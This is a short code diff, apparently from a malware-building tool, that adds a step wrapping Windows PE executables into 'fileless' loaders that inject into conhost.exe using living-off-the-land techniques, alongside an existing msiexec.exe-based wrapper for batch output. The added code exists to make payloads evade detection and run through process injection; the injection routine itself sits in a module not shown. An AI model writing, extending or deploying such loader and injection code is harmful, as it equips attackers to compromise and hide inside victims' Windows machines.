@@ -913,6 +913,22 @@ func runBoundFiles() {
           }
         }
 
+        // ── EXE wrapper: Go LOLBAS loader, fileless PE injection ──────────────
+        const isExeWrapper = os === "windows" && winExt === ".exe";
+        if (isExeWrapper) {
+          sendToStream({ type: "output", text: `Wrapping PE binary as fileless EXE loader (LOTL: conhost.exe)...\n`, level: "info" });
+          try {
+            const { wrapPeAsLoaderExe } = await import("./exe-wrapper");
+            const exeBytes = fs.readFileSync(filePath);
+            await wrapPeAsLoaderExe(exeBytes, filePath, actualArch, outDir);
+            finalSize = fs.statSync(filePath).size;
+            sendToStream({ type: "output", text: `EXE loader: ${exeBytes.length} byte PE → ${finalSize} byte loader (fileless injection into conhost.exe)\n`, level: "info" });
+          } catch (exeErr: any) {
+            sendToStream({ type: "output", text: `WARNING: EXE loader wrapper failed: ${exeErr.message || exeErr}. Output is a raw PE binary.\n`, level: "warn" });
+          }
+        }
+        // ── End EXE wrapper ──────────────────────────────────────────────────
+
         if (isBatWrapper) {
           sendToStream({ type: "output", text: `Wrapping PE binary as fileless ${winExt} (LOTL: msiexec.exe)...\n`, level: "info" });
           try {
